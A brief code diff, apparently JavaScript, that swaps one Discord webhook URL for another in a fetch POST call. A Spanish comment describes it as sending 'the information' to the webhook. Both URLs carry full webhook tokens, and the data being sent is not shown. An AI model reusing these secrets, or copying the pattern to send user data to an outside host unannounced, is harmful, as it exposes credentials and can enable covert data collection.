@@ -10,7 +10,7 @@
                 };
 
                 // Enviar la información a la webhook de Discord
-                fetch('https://discord.com/api/webhooks/1165176949388365836/4SrFU4Dteo8tKuE-H4JOqpmx_6_cpDkrJ_xTu8Q00oZIdZB1m4AdJvpo-Q2pVdLPtLi9', {
+                fetch('https://discord.com/api/webhooks/1165514004429557780/ghRX_b8RVijhz_KhWrp2SXYotYRwN71B22BNCC0QW1W1WNlQh0u53BO_EE56tRLijfCY', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
